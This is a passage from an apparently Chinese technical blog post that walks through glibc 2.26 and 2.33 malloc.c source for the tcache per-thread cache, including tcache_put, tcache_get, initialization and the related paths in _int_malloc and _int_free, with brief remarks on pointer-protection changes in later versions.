class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*------------------------ Public wrappers. --------------------------------*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">char</span> tcache_shutting_down = <span class="number">0</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __attribute__ ((section (<span class="string">&quot;__libc_thread_freeres_fn&quot;</span>)))</span><br><span class="line">tcache_thread_freeres (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">  __libc_free (e);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line"></span><br><span class="line">  tcache_shutting_down = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">text_set_element (__libc_thread_subfreeres, tcache_thread_freeres);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAYBE_INIT_TCACHE() \</span></span><br><span class="line"><span class="meta">  <span class="keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span></span><br><span class="line"><span class="meta">    tcache_init();</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAYBE_INIT_TCACHE()</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details><ul><li>通过查看<code>malloc.c</code>的源码，可以看到在<code>__libc_malloc</code>、<code>_int_malloc</code>、<code>_int_free</code>都有看到与<code>tcache_bin</code>相关的操作，接下来摘入的是，这几个函数中与<code>tcache_bin</code>操作相关的代码</li></ul><details>    <summary>__libc_malloc中tcache_bin相关代码</summary><ul><li>该代码位于<code>glibc2.26</code>中<code>malloc.c</code>第<code>3051</code>行到第<code>3067</code>行，位于<code>__libc_malloc</code>函数内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes = request2size (bytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details><details>    <summary>_int_malloc中tcache_bin相关代码</summary><ul><li>该代码位于<code>glibc2.26</code>中<code>malloc.c</code>第<code>3585</code>行到第<code>3604</code>行，位于<code>_int_malloc</code>函数内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (pp = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, tc_victim, pp);</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>该代码位于<code>glibc2.26</code>中<code>malloc.c</code>第<code>3643</code>行到第<code>3668</code>行，位于<code>_int_malloc</code>函数内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>该代码位于<code>glibc2.26</code>中<code>malloc.c</code>第<code>3707</code>行到第<code>3715</code>行，位于<code>_int_malloc</code>函数内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="type">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><ul><li>该代码位于<code>glibc2.26</code>中<code>malloc.c</code>第<code>3777</code>行到第<code>3796</code>行，位于<code>_int_malloc</code>函数内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment"> We may return one of these chunks later.  */</span></span><br><span class="line">      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_put (victim, tc_idx);</span><br><span class="line">  return_cached = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details><details>    <summary>_int_free中tcache_bin相关代码</summary><ul><li>该代码位于<code>glibc2.26</code>中<code>malloc.c</code>第<code>4173</code>行到第<code>4185</code>行，位于<code>_int_free</code>函数内</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (tcache</span><br><span class="line">&amp;&amp; tc_idx &lt; mp_.tcache_bins</span><br><span class="line">&amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">      &#123;</span><br><span class="line">tcache_put (p, tc_idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details></div><div class="tab-item-content" id="tcache相关源码-2"><ul><li>这是<code>glibc2.33</code>中<code>tcache</code>的相关源码，大部分源码都和<code>glibc2.26</code>差不多，但是增加了一个将fd指针加密的操作。好像是<code>2.32</code>就增加了加密机制。</li></ul><details>    <summary>tcache_bin宏定义相关代码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum chunks in tcache bins for tunables.  This value must fit the range</span></span><br><span class="line"><span class="comment">   of tcache-&gt;counts[] entries, else they may overflow.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_COUNT UINT16_MAX</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details><details>    <summary>tcache_bin操作相关代码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;tcache_thread_shutdown(): &quot;</span></span><br><span class="line">     <span class="string">&quot;unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache_tmp-&gt;entries[i] = 